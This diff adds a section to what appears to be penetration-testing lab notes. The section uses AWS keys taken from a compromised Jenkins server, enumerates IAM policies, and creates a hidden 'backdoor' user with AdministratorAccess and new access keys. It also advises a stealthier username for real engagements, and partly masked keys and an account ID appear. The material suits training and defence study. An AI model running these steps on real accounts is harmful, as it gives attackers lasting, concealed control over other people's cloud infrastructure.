@@ -1390,7 +1390,112 @@ env | grep AWS # Copy the details then used for the backdoor
      - Discovering What We Have Access To
      - Creating a Backdoor Account
 ### Discovering What We Have Access To
-- 
+There are multiple methods for discovering the permission boundaries of our current account. The easiest method would be to use the account to list its own information and policies, but this only works if the user has permissions to list its access. Another option is to brute force all API calls and log the successful ones. However, this option is very noisy, and we should avoid it when we can.
+- Let's try to list the policy manually first. We can begin by creating a new AWS profile with the credentials we discovered. We'll do this using the aws configure command, providing the --profile argument with the name CompromisedJenkins. We'll then supply the Access Key ID and Secret Access Key we discovered. Next, we'll set the region to us-east-1, since that's what we've encountered thus far. Finally, we'll leave the output format to the default setting.
+- These creds found above command ```env | grep AWS```
+```bash
+aws configure --profile=CompromisedJenkins                                    
+AWS Access Key ID [None]: AKIA55D2EIRFOKKIMGD# # Instead # it is C
+AWS Secret Access Key [None]: +oQMj10R5eOx18Uy7AnJ0GTLTF+mRmFXKaDxMq1# # Instead # it is C
+Default region name [None]: us-east-1
+Default output format [None]: json
+```
+- Let's obtain the username next. To do so, we'll run the iam get-user subcommand to the aws command. We'll also need to provide the --profile CompromisedJenkins argument to ensure we're using the compromised credentials.
+```bash
+aws --profile CompromisedJenkins sts get-caller-identity # below is output
+{
+    "UserId": "AIDA55D2EIRFN6LBRISUP",
+    "Account": "955886355530",
+    "Arn": "arn:aws:iam::955886355530:user/system/jenkins-admin"
+}
+```
+- From the output, we find that the username is jenkins-admin. Next, let's discover what permissions our account has. There are three ways an administrator may attach a policy to a user:
+     - Inline Policy: Policy made only for a single user account and attached directly.
+     - Managed Policy Attached to User: Customer- or AWS-managed policy attached to one or more users.
+     - Group Attached Policy: Inline or Managed Policy attached to a group, which is assigned to the user.
+- To determine the permission boundary, we need to list all three policy attachment types. We'll use iam list-user-policies for the inline policy, iam list-attached-user-policies for the managed policy attached to the user, and iam list-groups-for-user to list the groups the user is in. For each command, we'll also provide the --user-name jenkins-admin argument and select the profile.
+```bash
+aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin  #  "PolicyNames":"jenkins-admin-role"
+aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin # AttachedPolicies
+aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin  # Groups
+```
+- Based on the output, we find that the user contains only a single inline policy. Next, let's list the actual policy to determine what we have access to. We can use the **iam get-user-policy** sub command to achieve this. We'll specify the username and the policy name with the --**user-name jenkins-admin** and --**policy-name jenkins-admin-role** arguments.
+```bash
+aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role # Output below
+{
+    "UserName": "jenkins-admin",
+    "PolicyName": "jenkins-admin-role",
+    "PolicyDocument": {
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Action": "*",
+                "Effect": "Allow",
+                "Resource": "*"
+            }
+        ]
+    }
+}
+```
+### Creating a Backdoor Account
+- Next, let's create a backdoor account instead of using the jenkins-admin account. While still specifying the Jenkins credentials (**--profile CompromisedJenkins**), we'll run the **iam create-user** subcommand and pass in the username with **--user-name backdoor**.
+> In this example, we'll set the username as backdoor. However, in a real world engagement, we would choose a stealthier username, such as terraform-admin.
+
+```bash
+aws --profile CompromisedJenkins iam create-user --user-name backdoor # Below is output
+{
+    "User": {
+        "Path": "/",
+        "UserName": "backdoor",
+        "UserId": "AIDA55D2EIRFBAXTPPC6G",
+        "Arn": "arn:aws:iam::955886355530:user/backdoor",
+        "CreateDate": "2024-12-25T20:11:56+00:00"
+    }
+}
+```
+- Next, we'll attach the AWS managed [AdministratorAccess](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html#jf_administrator) policy. We'll do this by using the iam attach-user-policy subcommand, providing the username with --user-name. We'll also specify the ARN of the AdministratorAccess policy by using the --policy-arn arn:aws:iam::aws:policy/AdministratorAccess argument.
+```bash
+aws --profile CompromisedJenkins iam attach-user-policy  --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess # No output
+```
+- Next, we need to create the access key and secret key for the user. We'll use the **iam create-access-key** subcommand.
+```bash
+aws --profile CompromisedJenkins iam create-access-key --user-name backdoor  # Below output                                  
+{
+    "AccessKey": {
+        "UserName": "backdoor",
+        "AccessKeyId": "AKIA55D2EIRFGFHSOIG#", # # as V
+        "Status": "Active",
+        "SecretAccessKey": "8EoHbsCjEEWhW6M1jlj8ra6opvvuAKQ2qI8WJS#l",  # # as j
+        "CreateDate": "2024-12-25T20:16:27+00:00"
+    }
+}
+```
+- Finally, we'll configure a new profile in our AWS CLI with the newly-obtained credentials. We'll confirm everything works by listing the attached user policies by using the iam list-attached-user-policies subcommand.
+```bash
+kali@kali:~/HTB/aws$ aws configure --profile=backdoor                                            
+AWS Access Key ID [None]: AKIA55D2EIRFGFHSOIG# # # as V
+AWS Secret Access Key [None]: 8EoHbsCjEEWhW6M1jlj8ra6opvvuAKQ2qI8WJS#l # # as j
+Default region name [None]: us-east-1
+Default output format [None]: json           
+```
+- iam list-attached-user-policies
+```bash
+aws --profile backdoor iam list-attached-user-policies --user-name backdoor  # Below is output
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "AdministratorAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+        }
+    ]
+}
+```
+- Lab: Discover the flag in the ec2 instance tag.
+```bash
+aws --profile backdoor ec2 describe-tags 
+```
+## Dependency Chain Abuse
+
 
 # Special Thanks to the Creator of tools and Community
 [![](https://github.com/WithSecureLabs.png?size=50)](https://github.com/WithSecureLabs)
